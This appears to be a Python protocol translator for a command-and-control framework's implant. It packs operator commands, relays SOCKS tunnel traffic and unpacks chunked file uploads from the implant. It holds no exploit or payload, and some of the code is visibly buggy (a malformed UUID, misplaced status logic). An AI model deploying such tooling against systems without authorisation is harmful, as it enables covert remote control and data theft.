from Translator.Utils import *

import ipaddress

def CheckinImp( uuid ):
    Dbg1( "------------------------" );

    Data = uuid.encode();

    Dbg1( f"data: {Data}" );

    Dbg1( "------------------------" );

    return Data;

def RespTasking( Tasks, Socks ) -> bytes:
    Dbg3("------------------------")

    Pkg     = Packer()
    JobID   = Jobs["get_tasking"]["hex_code"]
    SockPkg = Packer()
    TaskLength = len(Tasks)

    Dbg3(f"task quantity {TaskLength}")

    for Sock in Socks:
        TaskLength += 1
        SrvId = Sock["server_id"]
        Data  = Sock["data"]
        Ext   = Sock["exit"]

        if Ext is False:
            Ext = 0
        else:
            Ext = 1

        TaskUUIDSck = "55555555-5555-5555-555-555555555555"

        Dbg3( f"socks exit: {Ext}" )
        Dbg3( f"socks id: {SrvId}" )

        if Data is not None:
            Dbg3( f"socks data: {Data} [{len( Data )} bytes]" )
        
        SockPkg.Int16( T_SOCKS )
        SockPkg.Int32( Ext )
        SockPkg.Int32( SrvId )

        if Data is not None:
            SockPkg.Bytes( Data.encode() )    

        Dbg3( f"socks all buffer: {SockPkg.buffer} [{SockPkg.length} bytes]" )

    Pkg.Int8( JobID )
    Pkg.Int32( TaskLength )

    for Sock in Socks:
        Pkg.Bytes( TaskUUIDSck.encode() )
        Pkg.Bytes( SockPkg.buffer )

    for Task in Tasks:
        Command  = Task["command"]
        TaskUUID = Task["id"].encode()

        Parameters = {}
        if Task["parameters"] is None or Task["parameters"] == "":
            Parameters = {}
        else:
            try:
                if isinstance(Task["parameters"], str):
                    Parameters = json.loads(Task["parameters"])
                elif isinstance(Task["parameters"], dict):
                    Parameters = Task["parameters"]
                else:
                    Parameters = {}
            except (json.JSONDecodeError, TypeError):
                Parameters = {}

        Pkg.Bytes(TaskUUID)
        TaskPkg = Packer()

        if "action" in Parameters:
            main_cmd = Command
            sub_cmd = Parameters["action"]

            if main_cmd in Commands and 'subcommands' in Commands[main_cmd]:
                CommandID = Commands[main_cmd]['hex_code']
                
                if sub_cmd in Commands[main_cmd]['subcommands']:
                    SubCommandID = Commands[main_cmd]['subcommands'][sub_cmd]['sub']
                else:
                    Dbg3(f"Unknown subcommand: {sub_cmd}")
                    continue
            else:
                Dbg3(f"Command doesn't support subcommands: {main_cmd}")
                continue
        else:
            if Command in Commands:
                CommandID = Commands[Command]['hex_code']
                SubCommandID = 0
            else:
                Dbg3(f"Unknown command: {Command}")
                continue

        TaskPkg.Int16(int(CommandID))
        Dbg3( f"command id: {CommandID}" )
        
        if SubCommandID != 0:
            TaskPkg.Int8(SubCommandID)
            Dbg3( f"sub id: {SubCommandID}" )

        for Key, Val in Parameters.items():
            if Key != "action":
                try:
                    hex_bytes = bytes.fromhex(Val)
                    Dbg3(f"key: {Key} parameter with len: {len(hex_bytes)} [type: hex:bytes]")
                    TaskPkg.Pad(hex_bytes)
                except (ValueError, AttributeError, TypeError):
                    if isinstance(Val, str):
                        Dbg3(f"key: {Key} parameter: {Val} [type: str]")
                        TaskPkg.Bytes(str(Val).encode())
                    elif isinstance(Val, int):
                        Dbg3(f"key: {Key} parameter: {int(Val)} [type: int]")
                        TaskPkg.Int32(int(Val))
                    elif isinstance(Val, bool):
                        Dbg3(f"key: {Key} parameter: {int(Val)} [type: bool]")
                        TaskPkg.Int32(int(Val))
                    elif isinstance(Val, bytes):
                        Dbg3(f"key: {Key} parameter: {len(Val)} [type: bytes]")
                        TaskPkg.Pad(Val)
            
        if SockPkg.buffer:
            sock_data = SockPkg.buffer
            Pkg.Bytes( sock_data )

        task_data = TaskPkg.buffer

        Dbg3(f"task uuid: {TaskUUID} with [{len(task_data)} bytes]")
        Pkg.Bytes(task_data)

    Dbg3("------------------------")
    return Pkg.buffer

def RespPosting( Responses ):
    Dbg2( "------------------------" );

    if not Responses:
        Dbg2("No responses to post.")
        return b""

    Dbg2( f"responses: {Responses}" );

    Data = len( Responses ).to_bytes( 4, "big" );

    Pkg = Packer();

    for Response in Responses:
        if Response["status"] == "success":
            Data += b"\x01";
        else: 
            Data += b"\x00";
    
    Dbg2( f"status: {Response['status']}" );

    if Response["status"] == "success":
        Pkg.Int32( 1 );
    else: 
        Pkg.Int32( 0 );
    
    for Response in Responses:
        FileID = Response.get( "file_id" )
        if FileID:
            Pkg.Bytes( FileID.encode( "utf-8" ) );
            Dbg2( f"file id: {FileID}" );

        TotalChunks = Response.get( "total_chunks" );
        if TotalChunks:
            Pkg.Int32( TotalChunks );
            Dbg2( f"total chunks: {TotalChunks}" );

        ChunkNbr = Response.get( "chunk_num" );
        if ChunkNbr:
            Pkg.Int32( ChunkNbr );
            Dbg2( f"chunk number: {ChunkNbr}" );
        
        ChunkData = Response.get( "chunk_data" );
        if ChunkData:
            Pkg.Bytes( base64.b64decode( ChunkData ) );
            Dbg2( f"Chunk Data: {len( base64.b64decode( ChunkData ) )} bytes" );
            Data = Pkg.buffer;

    Dbg2( "------------------------" );
    
    return Data
